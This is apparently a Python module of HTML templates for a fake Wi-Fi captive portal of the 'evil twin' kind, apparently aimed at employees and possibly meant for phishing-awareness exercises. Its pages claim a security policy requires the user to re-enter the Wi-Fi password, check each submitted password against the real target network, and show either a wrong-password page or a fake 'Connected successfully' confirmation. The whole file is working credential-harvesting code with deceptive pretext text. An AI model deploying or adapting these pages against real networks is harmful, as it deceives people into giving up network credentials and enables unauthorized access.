"""HTML templates for the captive portal (employee-facing pages)."""

from __future__ import annotations

import html
from typing import Any


def _e(value: str) -> str:
    return html.escape(value or "", quote=True)


def _classic_shell(*, title: str, body: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>{_e(title)}</title>
  <style>
    * {{ box-sizing: border-box; }}
    body {{
      margin: 0;
      min-height: 100vh;
      background: linear-gradient(160deg, #eef2f7 0%, #dde4ec 100%);
      color: #1a1a1a;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      font-size: 15px;
      padding: 20px 16px;
      -webkit-font-smoothing: antialiased;
    }}
    .wrap {{
      width: 100%;
      max-width: 420px;
      margin: 32px auto 0;
      background: #fff;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12), 0 1px 3px rgba(0, 0, 0, 0.08);
      overflow: hidden;
      border: 1px solid rgba(0, 0, 0, 0.06);
    }}
    .hd {{
      background: linear-gradient(180deg, #2b579a 0%, #1e3f72 100%);
      color: #fff;
      padding: 14px 20px;
      font-weight: 600;
      font-size: 15px;
      letter-spacing: 0.02em;
      text-align: center;
    }}
    .bd {{ padding: 24px 22px 26px; }}
    .ssid {{
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin: 0 0 6px;
      line-height: 1.3;
      word-break: break-word;
      color: #111;
    }}
    .ssid-sub {{
      text-align: center;
      font-size: 13px;
      color: #666;
      margin: 0 0 20px;
    }}
    .note {{
      color: #444;
      margin: 0 0 20px;
      line-height: 1.55;
      font-size: 14px;
      text-align: center;
    }}
    .field-row {{
      display: flex;
      align-items: stretch;
      gap: 0;
      width: 100%;
      border: 1px solid #b0b8c4;
      overflow: hidden;
      background: #fff;
      transition: border-color 0.15s, box-shadow 0.15s;
    }}
    .field-row:focus-within {{
      border-color: #2b579a;
      box-shadow: 0 0 0 3px rgba(43, 87, 154, 0.15);
    }}
    .field-row .prefix {{
      flex: 0 0 auto;
      display: flex;
      align-items: center;
      padding: 0 14px;
      font-weight: 500;
      font-size: 14px;
      color: #333;
      background: #f4f6f9;
      border-right: 1px solid #b0b8c4;
      white-space: nowrap;
    }}
    .field-row input[type=password] {{
      flex: 1 1 auto;
      width: 100%;
      min-width: 0;
      min-height: 44px;
      padding: 10px 14px;
      border: none;
      outline: none;
      font-family: inherit;
      font-size: 16px;
      background: #fff;
    }}
    .actions {{ margin-top: 20px; text-align: center; }}
    input[type=submit], button {{
      min-width: 140px;
      min-height: 44px;
      padding: 10px 28px;
      font-family: inherit;
      font-size: 15px;
      font-weight: 600;
      color: #fff;
      background: linear-gradient(180deg, #3a6db5 0%, #2b579a 100%);
      border: 1px solid #1e3f72;
      cursor: pointer;
      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
      transition: background 0.15s, box-shadow 0.15s;
    }}
    input[type=submit]:hover, button:hover {{
      background: linear-gradient(180deg, #4580cc 0%, #336aab 100%);
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.18);
    }}
    input[type=submit]:active, button:active {{
      background: #1e3f72;
      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
    }}
    .foot {{
      margin-top: 18px;
      padding-top: 14px;
      border-top: 1px solid #e8ecf0;
      text-align: center;
      font-size: 12px;
      color: #888;
    }}
    .foot span {{ color: #2b7a3d; font-weight: 500; }}
    .spinner {{
      width: 40px;
      height: 40px;
      border: 3px solid #e0e4ea;
      border-top-color: #2b579a;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
      margin: 16px auto 18px;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .error {{
      color: #c0392b;
      font-weight: 600;
      font-size: 14px;
      margin: 0 0 18px;
      padding: 10px 14px;
      background: #fdf0ef;
      border: 1px solid #f5c6c2;
    }}
    h1 {{
      margin: 0 0 12px;
      font-size: 18px;
      font-weight: 600;
      color: #1a7a34;
    }}
    p {{ margin: 8px 0; line-height: 1.55; }}
    @media (min-width: 768px) {{
      body {{ padding: 48px 24px; }}
      .wrap {{ margin-top: 48px; }}
    }}
    @media (max-width: 480px) {{
      body {{ padding: 12px 10px; }}
      .wrap {{ margin-top: 16px; }}
      .bd {{ padding: 20px 16px 22px; }}
      .actions input[type=submit], .actions button {{ width: 100%; }}
    }}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="hd">{_e(title)}</div>
    <div class="bd">
{body}
    </div>
  </div>
</body>
</html>
"""


def _ssid_block(ssid: str) -> str:
    if not ssid:
        return ""
    return (
        f'<p class="ssid">{_e(ssid)}</p>'
        f'<p class="ssid-sub">Official network access verification</p>'
    )


def _password_field(password_label: str) -> str:
    label = _e(password_label or "Password")
    return f"""        <div class="field-row">
          <span class="prefix">{label}</span>
          <input id="p" name="password" type="password" autocomplete="off" autofocus aria-label="{label}"/>
        </div>"""


def _form_footer() -> str:
    return ''


def landing_page(*, ssid: str, title: str, organization: str, training_message: str, contact: str) -> str:
    """Fallback page when the password sign-in form is disabled."""
    _ = organization
    msg = f'<p class="note">{_e(training_message)}</p>' if training_message else ""
    contact_html = f'<p class="note">{_e(contact)}</p>' if contact else ""
    body = f"""      {_ssid_block(ssid)}
      {msg}
      {contact_html}
      <form method="post" action="/interact">
        <input type="hidden" name="action" value="continue"/>
        <div class="actions"><input type="submit" value="Continue"/></div>
      </form>
{_form_footer()}"""
    return _classic_shell(title=title, body=body)


def login_page(
    *,
    ssid: str,
    title: str,
    organization: str,
    password_label: str = "Password",
    button_label: str = "Connect",
) -> str:
    """Classic password-only captive-portal sign-in page. Form posts to /login."""
    _ = organization
    body = f"""      {_ssid_block(ssid)}
      <p class="note">This network is protected by a security policy. Enter the Wi-Fi password to confirm authorized access and restore connectivity.</p>
      <form method="post" action="/login" autocomplete="off">
{_password_field(password_label)}
        <div class="actions">
          <input type="submit" value="{_e(button_label)}"/>
        </div>
      </form>
{_form_footer()}"""
    return _classic_shell(title=title, body=body)


def spinner_page(*, title: str) -> str:
    """Shown while the submitted password is verified against the target network."""
    body = """      <div class="spinner" aria-hidden="true"></div>
      <p class="note">Verifying your credentials&hellip;</p>
      <p style="text-align:center;color:#888;font-size:13px;margin-top:-8px">Please wait.</p>
      <script>
        (function poll() {
          fetch("/login/result", { credentials: "same-origin", cache: "no-store" })
            .then(function(r) { return r.text(); })
            .then(function(html) {
              if (html.indexOf("data-figo-pending") >= 0) {
                setTimeout(poll, 500);
                return;
              }
              document.open();
              document.write(html);
              document.close();
            })
            .catch(function() { setTimeout(poll, 800); });
        })();
      </script>"""
    return _classic_shell(title=title, body=body)


def wrong_password_page(
    *,
    ssid: str,
    title: str,
    organization: str,
    password_label: str = "Password",
    button_label: str = "Connect",
) -> str:
    """Shown when the submitted password does not match the real network."""
    _ = organization
    body = f"""      {_ssid_block(ssid)}
      <p class="error" style="text-align:center">Incorrect password. Please try again.</p>
      <form method="post" action="/login" autocomplete="off">
{_password_field(password_label)}
        <div class="actions">
          <input type="submit" value="{_e(button_label)}"/>
        </div>
      </form>
{_form_footer()}"""
    return _classic_shell(title=title, body=body)


def connected_page(*, ssid: str, title: str, organization: str) -> str:
    """Classic captive-portal connected confirmation shown after sign-in."""
    _ = organization
    body = f"""      {_ssid_block(ssid)}
      <h1 style="text-align:center">&#10003; Connected successfully</h1>
      <p style="text-align:center;color:#444">Your credentials were verified. You now have network access.</p>
      <p style="text-align:center;color:#888;font-size:13px">You may close this page and continue browsing.</p>"""
    return _classic_shell(title=title, body=body)


def render_context(config: Any) -> dict[str, Any]:
    portal = getattr(config, "portal", None)
    return {
        "ssid": getattr(config, "effective_ssid", lambda: "")()
        if callable(getattr(config, "effective_ssid", None))
        else getattr(config, "target_ssid", ""),
        "title": getattr(portal, "portal_title", "Network Access Verification") if portal else "Network Access Verification",
        "organization": getattr(portal, "organization", "") if portal else "",
        "training_message": getattr(portal, "training_message", "") if portal else "",
        "contact": getattr(portal, "security_contact", "") if portal else "",
        "require_login": bool(getattr(portal, "require_login", True)) if portal else True,
        "password_label": getattr(portal, "login_password_label", "Password") if portal else "Password",
        "button_label": getattr(portal, "login_button_label", "Connect") if portal else "Connect",
        "verify_target_password": bool(getattr(portal, "verify_target_password", True)) if portal else True,
    }
